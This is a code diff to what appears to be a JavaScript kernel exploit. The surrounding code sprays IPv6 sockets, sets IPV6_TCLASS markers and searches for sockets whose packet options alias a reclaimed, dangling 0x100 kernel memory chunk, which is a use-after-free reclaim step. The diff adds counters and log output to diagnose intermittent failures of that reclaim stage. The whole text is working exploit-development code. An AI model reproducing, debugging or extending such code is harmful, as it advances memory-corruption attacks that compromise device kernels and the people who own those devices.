@@ -1827,6 +1827,7 @@ function makeRpc(worker) {
                         + "that is the reason, not the spray.");
 
                 let ptwins = null;
+                let pRounds = 0, pForeign = 0, pFails = 0, pLast = "";
                 const tclass = alloc(4), tclassLen = alloc(4);
                 for (let r = 0; r < EVF_ATTEMPTS && !ptwins; ++r) {
                     for (let i = 0; i < ipv6Socks.length; ++i)
@@ -1837,13 +1838,20 @@ function makeRpc(worker) {
                         sc(SYS.setsockopt, ipv6Socks[i], IPPROTO_IPV6,
                             IPV6_TCLASS, tclass.addr, 4);
                     }
+                    let roundForeign = 0, roundFails = 0;
+                    const tvals = [];
                     for (let j = 0; j < ipv6Socks.length; ++j) {
                         tclassLen.dv.setInt32(0, 4, true);
                         if (sc(SYS.getsockopt, ipv6Socks[j], IPPROTO_IPV6,
-                                IPV6_TCLASS, tclass.addr, tclassLen.addr).i32 === -1)
-                            continue;
+                                IPV6_TCLASS, tclass.addr, tclassLen.addr).i32 === -1) {
+                            roundFails++; continue;
+                        }
                         const idx = tclass.dv.getInt32(0, true);
+                        if (tvals.length < 8)
+                            tvals.push(idx === j ? "."
+                                : "0x" + (idx >>> 0).toString(16));
                         if (idx === j || idx < 0 || idx >= ipv6Socks.length) continue;
+                        roundForeign++;
                         if (ipv6Socks[idx] === ipv6Socks[j]) { dupSeen++; continue; }
                         ptwins = { round: r, a: ipv6Socks[j], b: ipv6Socks[idx] };
                         const hi2 = Math.max(j, idx), lo2 = Math.min(j, idx);
@@ -1859,6 +1867,18 @@ function makeRpc(worker) {
                         }
                         break;
                     }
+                    pRounds++; pForeign += roundForeign; pFails += roundFails;
+                    // Telemetry for the intermittent 0x100 reclaim failure seen
+                    // on hardware (2026-10-29): report whether any socket ever
+                    // returned a foreign marker, i.e. whether the aliased chunk
+                    // was ever reclaimed at all.
+                    if (!ptwins && (r % 16 === 15 || r === EVF_ATTEMPTS - 1)) {
+                        pLast = tvals.join(",");
+                        mark("PKTOPTS-SCAN", "round=" + r
+                            + " foreign=" + pForeign + " fails=" + pFails
+                            + " tclass[" + tvals.length + "]=" + pLast);
+                    }
+                    if (ptwins) break;
                 }
                 mark("DELETE-ERRS", hx(derr0) + "," + hx(derr1)
                     + "   (" + delMs + " ms)");
@@ -1873,8 +1893,9 @@ function makeRpc(worker) {
                 if (!check("0x100-chunk-reclaimed-pktopts", !!ptwins,
                         ptwins ? ("pktopts twins are fds " + ptwins.a + " and "
                                   + ptwins.b + " after " + ptwins.round + " round(s)")
-                               : "no pktopts twins found -- the 0x100 chunk is "
-                                 + "dangling, reboot now"))
+                               : (pRounds + " rounds, " + pForeign
+                                  + " foreign marker(s), " + pFails
+                                  + " getsockopt failure(s), last sample " + pLast)))
                     return false;
 
                 pktoptsTwins.push(ptwins.a, ptwins.b);
